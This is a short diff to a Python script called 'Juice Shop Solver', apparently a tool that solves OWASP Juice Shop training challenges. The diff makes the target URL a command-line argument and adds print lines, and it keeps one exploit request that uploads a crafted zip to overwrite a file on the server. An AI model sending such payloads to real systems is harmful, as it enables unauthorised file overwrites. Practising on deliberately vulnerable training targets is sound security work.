@@ -1,7 +1,12 @@
-url='http://localhost:3000' # Indicate the URL without '/' at the end
+#url='http://juiceshop.local:80' # Indicate the URL without '/' at the end
 # Open this URL before running the script
-import requests
+print("Juice Shop Solver - Original code by Bryan Fauquembergue")
+import sys
+if len(sys.argv) == 1: sys.argv[1:] = ["http://localhost:3000"]
+url = sys.argv[1]
 
+import requests
+print("Creating Traffic Against URL: " +  url)
 # ==== No required action ====
 # ---- Arbitrary File Write (Overwrite the Legal Information file.)
 requests.post(url+'/file-upload', files={'file':open('file-upload/Arbitrary File Write.zip','rb')})
